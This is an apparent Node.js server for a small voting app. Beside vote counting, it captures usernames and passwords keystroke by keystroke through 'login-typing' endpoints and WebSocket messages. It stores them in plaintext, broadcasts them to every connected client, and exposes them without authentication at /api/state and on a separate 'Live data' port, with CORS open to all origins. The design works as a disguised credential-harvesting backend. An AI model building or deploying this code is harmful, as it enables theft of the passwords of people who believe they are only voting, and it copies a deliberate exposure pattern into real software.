const express = require('express');
const http = require('http');
const path = require('path');
const { WebSocketServer, WebSocket } = require('ws');

const MAIN_PORT = Number(process.env.PORT) || 3000;
const DATA_PORT = process.env.DATA_PORT ? Number(process.env.DATA_PORT) : 3002;
const app = express();

const CANDIDATES = ['Amrit', 'Ashutosh', 'Suranjan', 'Tushar'];

const state = {
  tallies: Object.fromEntries(CANDIDATES.map((c) => [c, 0])),
  votes: [],
  logins: [],
};

function upsertLogin(entry) {
  const index = state.logins.findIndex((l) => l.sessionId === entry.sessionId);
  if (index >= 0) {
    state.logins[index] = entry;
  } else {
    state.logins.push(entry);
  }
}

// WebSocket client management
const wsClients = new Set();

function broadcast(message) {
  const data = JSON.stringify(message);
  for (const client of wsClients) {
    if (client.readyState === WebSocket.OPEN) {
      try {
        client.send(data);
      } catch (err) {
        wsClients.delete(client);
      }
    }
  }
}

function setupWebSocket(httpServer) {
  const wss = new WebSocketServer({ server: httpServer });
  wss.on('connection', (ws) => {
    wsClients.add(ws);

    // Send full current state immediately on connect
    ws.send(JSON.stringify({ type: 'STATE', payload: state, state }));

    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        if (msg.type === 'LOGIN_TYPING') {
          const { sessionId, username, password } = msg.payload || msg;
          if (sessionId) {
            const existing = state.logins.find((l) => l.sessionId === sessionId);
            const entry = {
              sessionId,
              username: username ?? '',
              password: password ?? '',
              timestamp: existing?.timestamp || Date.now(),
              updatedAt: Date.now(),
              isLive: true,
            };
            upsertLogin(entry);
            broadcast({ type: 'LOGIN_TYPING', payload: entry, state });
          }
        } else if (msg.type === 'LOGIN') {
          const { sessionId, username, password, timestamp } = msg.payload || msg;
          if (sessionId && username?.trim() && password?.trim()) {
            const entry = {
              sessionId,
              username: username.trim(),
              password: password.trim(),
              timestamp: timestamp || Date.now(),
              updatedAt: Date.now(),
              isLive: false,
            };
            upsertLogin(entry);
            broadcast({ type: 'LOGIN', payload: entry, state });
          }
        } else if (msg.type === 'VOTE') {
          const { candidate, voterName, timestamp } = msg.payload || msg;
          if (CANDIDATES.includes(candidate) && voterName?.trim()) {
            const vote = {
              candidate,
              voterName: voterName.trim(),
              timestamp: timestamp || Date.now(),
            };
            state.tallies[candidate] = (state.tallies[candidate] || 0) + 1;
            state.votes.push(vote);
            broadcast({ type: 'VOTE', payload: vote, tallies: { ...state.tallies }, state });
          }
        }
      } catch (err) {
        console.error('WS message error:', err);
      }
    });

    ws.on('close', () => {
      wsClients.delete(ws);
    });

    ws.on('error', () => {
      wsClients.delete(ws);
    });
  });
  return wss;
}

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Allow-Private-Network', 'true');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

app.get('/api/state', (_req, res) => {
  res.json({
    tallies: { ...state.tallies },
    votes: [...state.votes],
    logins: [...state.logins],
  });
});

app.post('/api/login-typing', (req, res) => {
  const { sessionId, username, password } = req.body || {};
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  const existing = state.logins.find((l) => l.sessionId === sessionId);
  const entry = {
    sessionId,
    username: username ?? '',
    password: password ?? '',
    timestamp: existing?.timestamp || Date.now(),
    updatedAt: Date.now(),
    isLive: true,
  };
  upsertLogin(entry);
  broadcast({ type: 'LOGIN_TYPING', payload: entry, state });
  res.json({ ok: true, login: entry });
});

app.post('/api/login', (req, res) => {
  const { sessionId, username, password, timestamp } = req.body || {};
  if (!sessionId || !username?.trim() || !password?.trim()) {
    return res.status(400).json({ error: 'Invalid login' });
  }

  const entry = {
    sessionId,
    username: username.trim(),
    password: password.trim(),
    timestamp: timestamp || Date.now(),
    updatedAt: Date.now(),
    isLive: false,
  };
  upsertLogin(entry);
  broadcast({ type: 'LOGIN', payload: entry, state });
  res.json({ ok: true, login: entry });
});

app.post('/api/vote', (req, res) => {
  const { candidate, voterName, timestamp } = req.body || {};
  if (!CANDIDATES.includes(candidate) || !voterName?.trim()) {
    return res.status(400).json({ error: 'Invalid vote' });
  }

  const vote = {
    candidate,
    voterName: voterName.trim(),
    timestamp: timestamp || Date.now(),
  };
  state.tallies[candidate] = (state.tallies[candidate] || 0) + 1;
  state.votes.push(vote);
  broadcast({ type: 'VOTE', payload: vote, tallies: { ...state.tallies }, state });
  res.json({ ok: true, vote, tallies: { ...state.tallies } });
});

app.get('/favicon.ico', (_req, res) => res.status(204).end());

app.use(express.static(path.join(__dirname, 'public')));

app.get('/results', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'results.html'));
});

app.get('/data', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'data', 'index.html'));
});

app.get('/data/', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'data', 'index.html'));
});

const server = http.createServer(app);
setupWebSocket(server);

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Error: Port ${MAIN_PORT} is already in use. Please close the process using port ${MAIN_PORT} or specify a different PORT.`);
    process.exit(1);
  } else {
    console.error('Server error:', err);
  }
});

server.listen(MAIN_PORT, '0.0.0.0', () => {
  console.log(`Voting app:  http://localhost:${MAIN_PORT}`);
  console.log(`API & WS:    ws://localhost:${MAIN_PORT}`);
});

if (DATA_PORT && DATA_PORT !== MAIN_PORT) {
  const dataServer = http.createServer(app);
  setupWebSocket(dataServer);
  dataServer.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.log(`Note: Port ${DATA_PORT} is in use; live data is still accessible at http://localhost:${MAIN_PORT}/data`);
    } else {
      console.error('Data server error:', err);
    }
  });
  dataServer.listen(DATA_PORT, () => {
    console.log(`Live data:     http://localhost:${DATA_PORT}/data`);
  });
}
